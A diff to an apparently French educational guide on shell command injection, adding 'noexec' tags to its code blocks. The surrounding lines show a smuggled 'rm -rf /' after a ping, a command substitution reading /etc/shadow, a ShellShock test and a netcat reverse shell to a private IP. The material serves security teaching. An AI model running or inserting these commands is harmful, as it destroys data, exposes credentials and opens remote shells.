@@ -51,14 +51,14 @@ Commande          : ping -c4 210.1.43.27;rm -rf /
 
 ### Substitution de commande
 
-```bash
+```bash noexec
 $ ./script.sh "`cat /etc/shadow`"
 # Affiche le contenu du fichier shadow
 ```
 
 ### ShellShock (CVE-2014-6271)
 
-```bash
+```bash noexec
 # Test de vulnerabilite
 env x='() { :;}; echo vuln' bash -c "test"
 
@@ -85,7 +85,7 @@ Attaquant (listener)            Cible (compromise)
 
 ### Variantes (contexte educatif -- comprendre pour defendre)
 
-```bash
+```bash noexec
 # Netcat
 nc -e /bin/sh 192.168.174.1 4443
 
